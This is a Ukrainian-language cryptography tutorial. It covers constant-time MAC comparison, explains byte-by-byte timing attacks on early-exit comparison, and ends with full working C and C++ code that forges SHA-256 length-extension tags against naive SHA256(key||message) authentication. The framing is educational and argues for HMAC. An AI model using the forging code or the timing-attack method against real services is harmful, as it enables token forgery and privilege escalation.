# ⚙️ Верифікація MAC у константному часі та експлуатація вразливостей

Невідповідність між математичною моделлю криптографічного алгоритму та його фізичною реалізацією у програмному коді є головним джерелом практичних зламів. Звичайна перевірка рівності двох байтових масивів через стандартну функцію `memcmp()` або оператор `==` створює витік інформації через час виконання (часовий канал), що дозволяє зловмиснику дистанційно підбирати секретний автентифікаційний тег байт за байтом. Так само наївна конкатенація ключа і повідомлення у конструкції `SHA256(key || data)` дозволяє активному перехоплювачу підробляти авторизаційні токени через атаку подовженням довжини.

---

## 1. Анатомія та захист від часових атак (Timing Attacks)

Коли сервер перевіряє автентичність запиту (наприклад, валідність JWT-токену, підпису вебхука або HMAC-cookie), він обчислює очікуваний MAC і порівнює його з тегом, надісланим клієнтом у заголовку запиту.

### Вразлива реалізація з раннім виходом

Стандартні функції порівняння рядків та пам'яті оптимізовані компілятором для максимальної швидкодії: щойно виявлено першу невідповідність між байтами, цикл негайно переривається інструкцією умовного переходу.

:::tabs
```c
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

/* НЕБЕЗПЕЧНО: Ранній вихід дозволяє побайтовий підбір тегу */
bool vulnerable_verify_mac(const uint8_t *expected, const uint8_t *received, size_t len) {
    for (size_t i = 0; i < len; ++i) {
        if (expected[i] != received[i]) {
            return false; /* Час відповіді залежить від позиції першої помилки */
        }
    }
    return true;
}
```
```cpp
#include <cstddef>
#include <cstdint>
#include <span>

/* НЕБЕЗПЕЧНО: Ранній вихід дозволяє побайтовий підбір тегу */
[[nodiscard]] bool vulnerable_verify_mac(std::span<const uint8_t> expected,
                                         std::span<const uint8_t> received) noexcept {
    if (expected.size() != received.size()) {
        return false;
    }
    for (size_t i = 0; i < expected.size(); ++i) {
        if (expected[i] != received[i]) {
            return false; /* Час повернення корелює з кількістю вгаданих байтів */
        }
    }
    return true;
}
```
:::

### Фізика та статистика витоку інформації

Якщо згенерований компілятором код містить умовний перехід `jne`, час виконання функції залежить від індексу незбігу:
* **Байт 0 не збігся:** Функція переривається на першій ітерації (`~5` тактів процесора).
* **Байт 0 збігся, байт 1 не збігся:** Виконується дві ітерації (`~10` тактів процесора).
* **Перші `k` байтів збіглися:** Час виконання зростає лінійно: `t(k) ≈ k · Δt + t_0`.

Хоча на рівні одного HTTP-запиту різниця у кілька наносекунд маскується мережевим джиттером, зловмисник застосовує метод статистичного усереднення. Відправляючи вибірку з 500–1000 запитів для кожного з 256 можливих значень байта, атакуючий будує гістограму розподілу затримок і застосовує критерій Стьюдента або медіанний фільтр. Варіант байта, для якого середній час відгуку стабільно перевищує інші на величину `Δt`, є правильним.

Для 32-байтного HMAC-SHA256 повний підбір вимагає всього `32 × 256 = 8192` спроби замість нездійсненного перебору `2²⁵⁶` варіантів.

### Пастки оптимізатора компілятора та інструкції константного часу

Розробники часто намагаються написати цикл без оператора `return` або `break`, сподіваючись, що компілятор виконає всі ітерації. Проте сучасні оптимізуючі компілятори (GCC та Clang при прапорцях `-O2` або `-O3`) мають аналізатори потоку даних, які помічають, що кінцевий результат залежить лише від наявності хоча б однієї нерівності. У результаті оптимізатор автоматично трансформує безпечний на перший погляд код у векторні SIMD-інструкції з раннім перериванням (наприклад, `vptest` або `pcmpeqb` із подальшим переходом).

Щоб запобігти такій оптимізації, акумулятор розбіжностей оголошується як `volatile` або захищається вбудованими бар'єрами пам'яті (memory barriers).

### Безпечна реалізація у константному часі (Constant-Time)

Безпечний алгоритм зобов'язаний виконати однаковий набір інструкцій та прочитати всі елементи масиву незалежно від того, де саме розташована помилка або чи збігаються масиви взагалі.

:::tabs
```c
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

/* БЕЗПЕЧНО: Константний час порівняння без витоку затримки */
bool constant_time_memcmp(const uint8_t *a, const uint8_t *b, size_t len) {
    /* volatile забороняє оптимізатору компілятора вставити ранній вихід */
    volatile uint8_t diff = 0;
    
    for (size_t i = 0; i < len; ++i) {
        diff |= (uint8_t)(a[i] ^ b[i]);
    }
    
    return diff == 0;
}
```
```cpp
#include <cstddef>
#include <cstdint>
#include <span>

/* БЕЗПЕЧНО: Константний час порівняння з безпечним акумулятором розбіжностей */
[[nodiscard]] bool constant_time_memcmp(std::span<const uint8_t> a,
                                        std::span<const uint8_t> b) noexcept {
    if (a.size() != b.size()) {
        return false;
    }

    volatile uint8_t diff = 0;
    for (size_t i = 0; i < a.size(); ++i) {
        diff |= static_cast<uint8_t>(a[i] ^ b[i]);
    }

    return diff == 0;
}
```
:::

У цій реалізації побітова різниця `a[i] ^ b[i]` акумулюється в змінній `diff` через операцію порозрядного `OR`. Цикл виконує рівно `len` кроків. Значення `diff` дорівнює нулю тоді й лише тоді, коли всі байти `a[i]` та `b[i]` ідентичні.

### Верифікація константності за допомогою dudect

Для автоматизованої перевірки відсутності часового витоку в бінарному коді використовується інструмент `dudect` (Dude, is my code constant time?), заснований на непараметричному t-критерії Велча. Тестовий стенд генерує два класи вхідних пар: фіксований вектор проти випадкових векторів. Програма здійснює мільйони замірів процесорних тактів за допомогою інструкції `rdtsc`. Якщо t-статистика між двома розподілами перевищує поріг `|t| > 4.5`, код визнається вразливим до часового криптоаналізу.

Крім того, розробники повинні стежити за вирівнюванням даних у пам'яті: якщо один із буферів перетинає границю 64-байтної лінії кешу процесора (cache line split), доступ до нього може спричинити додаткову затримку на рівні L1-кешу, створюючи вторинний часовий канал.

---

## 2. Реалізація атаки подовженням повідомлення (Length Extension Attack)

Якщо розробник використовує наївний спосіб автентифікації `Token = SHA256(SecretKey || Message)`, активний зловмисник може додати до кінця повідомлення довільний суфікс `&admin=true` і згенерувати валідний підпис без знання `SecretKey`.

### Механізм реконструкції стану

1. **Формування структури блоків:** Геш-функції сімейства SHA-256 розбивають дані на 64-байтні блоки з додаванням обов'язкового заповнення Меркла — Дамґорда: перший байт `0x80`, послідовність нульових байтів `0x00` та 64-бітне ціле число довжини вхідних даних у бітах у порядку big-endian.
2. **Зчитування внутрішнього вектора:** Вихідний геш `H = SHA256(SecretKey || Message)` є точним станом внутрішніх 32-бітних регістрів `(h0, h1, ..., h7)` після обробки останнього 64-байтного блоку.
3. **Фальсифікація ланцюга:** Зловмисник реконструює байти заповнення першого повідомлення `Pad`, ініціалізує регістри SHA-256 значеннями з перехопленого гешу `H` (замість стандартного `IV`) і викликає компресійну функцію для нового блоку `ExtensionData`.
4. **Коректне поле довжини:** Друге заповнення `Pad_ext` розраховується так, ніби сукупне повідомлення починалося з самого ключа, враховуючи повний обсяг `len(Key) + len(OrigMsg) + len(Pad) + len(Ext)`.

Нижче наведено повнофункціональний інженерний код генератора розширеного повідомлення та підробленого гешу.

:::tabs
```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

/* Обертання бітів вправо */
#define ROTR(x, n) (((x) >> (n)) | ((x) << (32 - (n))))
#define CH(x, y, z) (((x) & (y)) ^ (~(x) & (z)))
#define MAJ(x, y, z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define EP0(x) (ROTR(x, 2) ^ ROTR(x, 13) ^ ROTR(x, 22))
#define EP1(x) (ROTR(x, 6) ^ ROTR(x, 11) ^ ROTR(x, 25))
#define SIG0(x) (ROTR(x, 7) ^ ROTR(x, 18) ^ ((x) >> 3))
#define SIG1(x) (ROTR(x, 17) ^ ROTR(x, 19) ^ ((x) >> 10))

static const uint32_t K[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

/* Компресійний крок SHA-256 над одним 64-байтним блоком */
void sha256_transform_block(uint32_t state[8], const uint8_t block[64]) {
    uint32_t w[64];
    for (size_t i = 0; i < 16; ++i) {
        w[i] = ((uint32_t)block[i * 4] << 24) |
               ((uint32_t)block[i * 4 + 1] << 16) |
               ((uint32_t)block[i * 4 + 2] << 8) |
               ((uint32_t)block[i * 4 + 3]);
    }
    for (size_t i = 16; i < 64; ++i) {
        w[i] = SIG1(w[i - 2]) + w[i - 7] + SIG0(w[i - 15]) + w[i - 16];
    }

    uint32_t a = state[0], b = state[1], c = state[2], d = state[3];
    uint32_t e = state[4], f = state[5], g = state[6], h = state[7];

    for (size_t i = 0; i < 64; ++i) {
        uint32_t t1 = h + EP1(e) + CH(e, f, g) + K[i] + w[i];
        uint32_t t2 = EP0(a) + MAJ(a, b, c);
        h = g; g = f; f = e; e = d + t1;
        d = c; c = b; b = a; a = t1 + t2;
    }

    state[0] += a; state[1] += b; state[2] += c; state[3] += d;
    state[4] += e; state[5] += f; state[6] += g; state[7] += h;
}

/* Формування заповнення Merkle-Damgard для відомої початкової довжини */
size_t build_md_padding(size_t total_len_bytes, uint8_t *pad_out) {
    size_t pad_len = 0;
    pad_out[pad_len++] = 0x80;
    
    size_t current_len = total_len_bytes + 1;
    while ((current_len % 64) != 56) {
        pad_out[pad_len++] = 0x00;
        current_len++;
    }
    
    uint64_t bit_len = (uint64_t)total_len_bytes * 8;
    for (int i = 7; i >= 0; --i) {
        pad_out[pad_len++] = (uint8_t)((bit_len >> (i * 8)) & 0xFF);
    }
    return pad_len;
}

/* Виконання атаки подовженням */
void length_extension_attack(const uint32_t original_hash[8],
                            size_t key_len,
                            const uint8_t *orig_msg, size_t orig_msg_len,
                            const uint8_t *extension, size_t ext_len,
                            uint8_t *forged_msg_out, size_t *forged_msg_len_out,
                            uint32_t forged_hash_out[8]) {
    /* 1. Обчислення заповнення для початкового блоку (Key || Message) */
    size_t total_orig_bytes = key_len + orig_msg_len;
    uint8_t pad[128];
    size_t pad_len = build_md_padding(total_orig_bytes, pad);

    /* 2. Збирання нового фальсифікованого повідомлення: orig_msg || pad || extension */
    memcpy(forged_msg_out, orig_msg, orig_msg_len);
    memcpy(forged_msg_out + orig_msg_len, pad, pad_len);
    memcpy(forged_msg_out + orig_msg_len + pad_len, extension, ext_len);
    *forged_msg_len_out = orig_msg_len + pad_len + ext_len;

    /* 3. Ініціалізація стану регістрів перехопленим гешем */
    memcpy(forged_hash_out, original_hash, 8 * sizeof(uint32_t));

    /* 4. Підготовка блоків розширення з урахуванням сукупної довжини */
    size_t new_total_bytes = total_orig_bytes + pad_len + ext_len;
    uint8_t ext_pad[128];
    size_t ext_pad_len = build_md_padding(new_total_bytes, ext_pad);

    size_t total_ext_stream_len = ext_len + ext_pad_len;
    uint8_t *ext_stream = (uint8_t *)malloc(total_ext_stream_len);
    if (!ext_stream) return;

    memcpy(ext_stream, extension, ext_len);
    memcpy(ext_stream + ext_len, ext_pad, ext_pad_len);

    /* 5. Прогін компресійної функції для всіх нових 64-байтних блоків */
    for (size_t offset = 0; offset < total_ext_stream_len; offset += 64) {
        sha256_transform_block(forged_hash_out, ext_stream + offset);
    }

    free(ext_stream);
}
```
```cpp
#include <array>
#include <cstddef>
#include <cstdint>
#include <span>
#include <vector>
#include <algorithm>

namespace crypto {

[[nodiscard]] constexpr uint32_t rotr(uint32_t x, uint32_t n) noexcept {
    return (x >> n) | (x << (32 - n));
}

[[nodiscard]] constexpr uint32_t ch(uint32_t x, uint32_t y, uint32_t z) noexcept {
    return (x & y) ^ (~x & z);
}

[[nodiscard]] constexpr uint32_t maj(uint32_t x, uint32_t y, uint32_t z) noexcept {
    return (x & y) ^ (x & z) ^ (y & z);
}

[[nodiscard]] constexpr uint32_t ep0(uint32_t x) noexcept {
    return rotr(x, 2) ^ rotr(x, 13) ^ rotr(x, 22);
}

[[nodiscard]] constexpr uint32_t ep1(uint32_t x) noexcept {
    return rotr(x, 6) ^ rotr(x, 11) ^ rotr(x, 25);
}

[[nodiscard]] constexpr uint32_t sig0(uint32_t x) noexcept {
    return rotr(x, 7) ^ rotr(x, 18) ^ (x >> 3);
}

[[nodiscard]] constexpr uint32_t sig1(uint32_t x) noexcept {
    return rotr(x, 17) ^ rotr(x, 19) ^ (x >> 10);
}

constexpr std::array<uint32_t, 64> K = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

void sha256_transform_block(std::array<uint32_t, 8>& state,
                            std::span<const uint8_t, 64> block) noexcept {
    std::array<uint32_t, 64> w{};
    for (size_t i = 0; i < 16; ++i) {
        w[i] = (static_cast<uint32_t>(block[i * 4]) << 24) |
               (static_cast<uint32_t>(block[i * 4 + 1]) << 16) |
               (static_cast<uint32_t>(block[i * 4 + 2]) << 8) |
               (static_cast<uint32_t>(block[i * 4 + 3]));
    }
    for (size_t i = 16; i < 64; ++i) {
        w[i] = sig1(w[i - 2]) + w[i - 7] + sig0(w[i - 15]) + w[i - 16];
    }

    uint32_t a = state[0], b = state[1], c = state[2], d = state[3];
    uint32_t e = state[4], f = state[5], g = state[6], h = state[7];

    for (size_t i = 0; i < 64; ++i) {
        const uint32_t t1 = h + ep1(e) + ch(e, f, g) + K[i] + w[i];
        const uint32_t t2 = ep0(a) + maj(a, b, c);
        h = g; g = f; f = e; e = d + t1;
        d = c; c = b; b = a; a = t1 + t2;
    }

    state[0] += a; state[1] += b; state[2] += c; state[3] += d;
    state[4] += e; state[5] += f; state[6] += g; state[7] += h;
}

[[nodiscard]] std::vector<uint8_t> build_md_padding(size_t total_len_bytes) {
    std::vector<uint8_t> pad;
    pad.push_back(0x80);

    size_t current_len = total_len_bytes + 1;
    while ((current_len % 64) != 56) {
        pad.push_back(0x00);
        current_len++;
    }

    const uint64_t bit_len = static_cast<uint64_t>(total_len_bytes) * 8;
    for (int i = 7; i >= 0; --i) {
        pad.push_back(static_cast<uint8_t>((bit_len >> (i * 8)) & 0xFF));
    }
    return pad;
}

struct ForgeryResult {
    std::vector<uint8_t> forged_message;
    std::array<uint32_t, 8> forged_hash;
};

[[nodiscard]] ForgeryResult length_extension_attack(
    const std::array<uint32_t, 8>& original_hash,
    size_t key_len,
    std::span<const uint8_t> orig_msg,
    std::span<const uint8_t> extension) {

    const size_t total_orig_bytes = key_len + orig_msg.size();
    const std::vector<uint8_t> pad = build_md_padding(total_orig_bytes);

    std::vector<uint8_t> forged_msg;
    forged_msg.reserve(orig_msg.size() + pad.size() + extension.size());
    forged_msg.insert(forged_msg.end(), orig_msg.begin(), orig_msg.end());
    forged_msg.insert(forged_msg.end(), pad.begin(), pad.end());
    forged_msg.insert(forged_msg.end(), extension.begin(), extension.end());

    std::array<uint32_t, 8> forged_state = original_hash;

    const size_t new_total_bytes = total_orig_bytes + pad.size() + extension.size();
    const std::vector<uint8_t> ext_pad = build_md_padding(new_total_bytes);

    std::vector<uint8_t> ext_stream;
    ext_stream.reserve(extension.size() + ext_pad.size());
    ext_stream.insert(ext_stream.end(), extension.begin(), extension.end());
    ext_stream.insert(ext_stream.end(), ext_pad.begin(), ext_pad.end());

    for (size_t offset = 0; offset < ext_stream.size(); offset += 64) {
        std::span<const uint8_t, 64> block(ext_stream.data() + offset, 64);
        sha256_transform_block(forged_state, block);
    }

    return {std::move(forged_msg), forged_state};
}

} // namespace crypto
```
:::

Цей інженерний експеримент доводить фундаментальну криптографічну тезу: якщо протокол використовує просту конкатенацію замість двопрохідної структури HMAC або блокового коду CMAC, система залишається вразливою до підробки повідомлень навіть за умови повної математичної надійності базової геш-функції SHA-256.
